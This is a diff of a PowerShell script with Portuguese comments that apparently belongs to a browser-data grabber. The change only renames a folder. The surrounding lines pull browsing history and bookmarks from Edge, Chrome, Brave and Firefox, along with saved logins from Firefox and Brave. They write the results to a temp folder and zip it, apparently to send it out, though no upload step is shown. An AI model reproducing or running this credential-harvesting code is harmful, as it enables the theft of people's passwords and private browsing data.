@@ -514,17 +514,17 @@ function Get-BrowserData {
 }
 
 # Criar uma pasta para os dados do navegador
-New-Item -ItemType Directory -Path "$env:TEMP\$FolderName\depois_muda_se" | Out-Null
+New-Item -ItemType Directory -Path "$env:TEMP\$FolderName\Dados-do-Browser" | Out-Null
 
 # Salvar os dados do navegador dentro da nova pasta
-Get-BrowserData -Browser "edge" -DataType "history" | Out-File "$env:TMP\$FolderName\depois_muda_se\BrowserData.txt"
-Get-BrowserData -Browser "edge" -DataType "bookmarks" | Out-File "$env:TMP\$FolderName\depois_muda_se\BrowserData.txt"
-Get-BrowserData -Browser "chrome" -DataType "history" | Out-File "$env:TMP\$FolderName\depois_muda_se\BrowserData.txt"
-Get-BrowserData -Browser "chrome" -DataType "bookmarks" | Out-File "$env:TMP\$FolderName\depois_muda_se\BrowserData.txt"
-Get-BrowserData -Browser "firefox" -DataType "history" | Out-File "$env:TMP\$FolderName\depois_muda_se\BrowserData.txt"
-Get-BrowserData -Browser "firefox" -DataType "logins" | Out-File "$env:TMP\$FolderName\depois_muda_se\BrowserData.txt"
-Get-BrowserData -Browser "brave" -DataType "history" | Out-File "$env:TMP\$FolderName\depois_muda_se\BrowserData.txt"
-Get-BrowserData -Browser "brave" -DataType "logins" | Out-File "$env:TMP\$FolderName\depois_muda_se\BrowserData.txt"
+Get-BrowserData -Browser "edge" -DataType "history" | Out-File "$env:TMP\$FolderName\Dados-do-Browser\BrowserData.txt"
+Get-BrowserData -Browser "edge" -DataType "bookmarks" | Out-File "$env:TMP\$FolderName\Dados-do-Browser\BrowserData.txt"
+Get-BrowserData -Browser "chrome" -DataType "history" | Out-File "$env:TMP\$FolderName\Dados-do-Browser\BrowserData.txt"
+Get-BrowserData -Browser "chrome" -DataType "bookmarks" | Out-File "$env:TMP\$FolderName\Dados-do-Browser\BrowserData.txt"
+Get-BrowserData -Browser "firefox" -DataType "history" | Out-File "$env:TMP\$FolderName\Dados-do-Browser\BrowserData.txt"
+Get-BrowserData -Browser "firefox" -DataType "logins" | Out-File "$env:TMP\$FolderName\Dados-do-Browser\BrowserData.txt"
+Get-BrowserData -Browser "brave" -DataType "history" | Out-File "$env:TMP\$FolderName\Dados-do-Browser\BrowserData.txt"
+Get-BrowserData -Browser "brave" -DataType "logins" | Out-File "$env:TMP\$FolderName\Dados-do-Browser\BrowserData.txt"
 ############################################################################################################################################################
 
 Compress-Archive -Path $env:tmp/$FolderName -DestinationPath $env:tmp/$ZIP
